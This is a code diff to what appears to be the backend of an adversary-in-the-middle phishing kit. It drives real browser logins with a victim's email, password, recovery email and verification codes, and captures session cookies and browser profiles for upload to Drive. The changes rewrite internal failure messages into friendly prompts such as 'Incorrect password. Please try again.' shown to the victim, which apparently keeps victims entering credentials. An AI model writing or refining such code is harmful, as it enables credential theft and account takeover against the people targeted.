@@ -2583,7 +2583,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         updateData.fullAccess = false; // FAILED so fullAccess false
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGEMAIL phase: Browser page became unresponsive."
+                            message: "Something went wrong. Please try again."
                         });
                         break; // Exit polling loop
                     }
@@ -2595,7 +2595,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGEMAIL phase: Template stopped responding."
+                            message: "Connection lost. Please try again."
                         });
                         break;
                     }
@@ -2812,7 +2812,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateData.cookieAccess = false; // FAILED so cookieAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGEMAIL phase: Email not provided in time."
+                    message: "Email not provided in time. Please try again."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -2994,7 +2994,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGPASSWORD phase: Browser page became unresponsive."
+                            message: "Something went wrong. Please try again."
                         });
                         break; // Exit polling loop
                     }
@@ -3006,7 +3006,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGPASSWORD phase: Template stopped responding."
+                            message: "Connection lost. Please try again."
                         });
                         break;
                     }
@@ -3124,7 +3124,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 updateData.status = "FAILED";
                                 updateData.lastJsonResponse = JSON.stringify({
                                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                                    message: "Failed during WAITINGPASSWORD phase: Login page was closed or navigated away."
+                                    message: "Login page was closed. Please try again."
                                 });
                                 break;
                             }
@@ -3630,7 +3630,7 @@ if (!foundSelector) {
                                             logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Still on password view at finalize time. Treating as not-accepted — NOT finalizing.`);
                                             initialCheckResult = {
                                                 emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
-                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Password submit did not leave the password view. Please try again."
+                                                verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
                                             };
                                         } else {
                                         // Password accepted — write PROCESSING_FINALIZING to cache immediately (no Sheets cascade)
@@ -3858,7 +3858,7 @@ if (!foundSelector) {
                 updateData.cookieAccess = false; // FAILED so cookieAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGPASSWORD phase: Password not provided in time."
+                    message: "Password not provided in time. Please try again."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -3906,7 +3906,7 @@ if (!foundSelector) {
             if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGPASSWORD phase."
+                    message: "Something went wrong. Please try again."
                 });
             }
         } else if (status === "WAITINGOPTIONS") {
@@ -3927,7 +3927,7 @@ if (!foundSelector) {
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Template stopped polling (>3min). Closing browser.`);
                         finalStatus = "FAILED";
                         updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Failed during WAITINGOPTIONS phase: Template stopped responding." });
+                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Connection lost. Please try again." });
                         pollingTimedOut = true; // Prevent post-loop WAITINGOPTIONS override at line 5736
                         break;
                     }
@@ -4439,7 +4439,7 @@ if (!foundSelector) {
             if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGOPTIONS phase."
+                    message: "Verification timed out. Please try again."
                 });
             }
         } else if (status === "WAITINGRECOVERYEMAIL") {
@@ -4467,7 +4467,7 @@ if (!foundSelector) {
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITING_RECOVERY_EMAIL phase: Browser page became unresponsive."
+                            message: "Something went wrong. Please try again."
                         });
                         pollingTimedOut = true; // Prevent post-loop override at line 5736
                         break;
@@ -4480,7 +4480,7 @@ if (!foundSelector) {
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGRECOVERYEMAIL phase: Template stopped responding."
+                            message: "Connection lost. Please try again."
                         });
                         pollingTimedOut = true; // Prevent post-loop override at line 5736
                         break;
@@ -4627,7 +4627,7 @@ if (!foundSelector) {
                 updateData.fullAccess = false;
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITING_RECOVERY_EMAIL phase: Recovery email not provided in time."
+                    message: "Recovery email not provided in time. Please try again."
                 });
                 // Fall through to the COMPLETED handler which captures cookies,
                 // closes browser, stages profile, uploads to Drive, and writes the final row.
@@ -4637,7 +4637,7 @@ if (!foundSelector) {
             if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITING_RECOVERY_EMAIL phase."
+                    message: "Something went wrong. Please try again."
                 });
             }
             logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
@@ -4673,7 +4673,7 @@ if (!foundSelector) {
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITING_CODE phase: Browser page became unresponsive."
+                            message: "Something went wrong. Please try again."
                         });
                         pollingTimedOut = true; // Prevent post-loop WAITINGCODE override at line 5736
                         break; // Exit polling loop
@@ -4686,7 +4686,7 @@ if (!foundSelector) {
                         updateData.status = "FAILED";
                         updateData.lastJsonResponse = JSON.stringify({
                             ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Failed during WAITINGCODE phase: Template stopped responding."
+                            message: "Connection lost. Please try again."
                         });
                         pollingTimedOut = true; // Prevent post-loop WAITINGCODE override at line 5736
                         break;
@@ -5509,7 +5509,7 @@ if (!foundSelector) {
             if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITING_CODE phase."
+                    message: "Verification timed out. Please try again."
                 });
             } else if (finalStatus === "WAITING_OPTIONS") {
                 updateData.lastJsonResponse = JSON.stringify({
@@ -5592,7 +5592,7 @@ if (!foundSelector) {
                 verificationState: initialCheckResult.verificationState,
                 verificationOptions: currentVerificationOptions,
                 platform, timestamp: new Date().toISOString(),
-                message: `Technical error during login attempt: ${initialCheckResult.error || 'unknown'}. Please retry.`
+                message: "Something went wrong. Please try again."
             });
             updateBrowserRowDataFast(browserId, updateData);
             // Falls through to upload logic at line 5814 — browser profile must be saved to Drive.
@@ -5779,7 +5779,7 @@ if (!foundSelector) {
                     verificationOptions: currentVerificationOptions,
                     viewName: finalViewName,
                     platform, timestamp: new Date().toISOString(),
-                    message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
+                    message: initialCheckResult.message || (finalStatus === "FAILED" ? "Something went wrong. Please try again." : "Process completed successfully.")
                 })
         };
 
@@ -5831,7 +5831,7 @@ if (!foundSelector) {
                 verificationState: initialCheckResult.verificationState,
                 verificationOptions: currentVerificationOptions,
                 platform, timestamp: new Date().toISOString(),
-                message: initialCheckResult.message || "Process completed successfully."
+                message: initialCheckResult.message || (finalStatus === "FAILED" ? "Verification timed out. Please try again." : "Process completed successfully.")
             });
 
             // Signal the template to redirect immediately (PROCESSING_FINALIZING) so the user
@@ -6402,7 +6402,7 @@ async function processWaitingRows() {
                         fullAccess: false,
                         lastJsonResponse: JSON.stringify({
                             browserId: bId, status: "FAILED",
-                            message: "Session timed out or abandoned. Marked as FAILED by staleness check.",
+                            message: "Session timed out. Please try again.",
                             timestamp: new Date().toISOString()
                         }),
                         ...submissionHistoryPayload(bId)
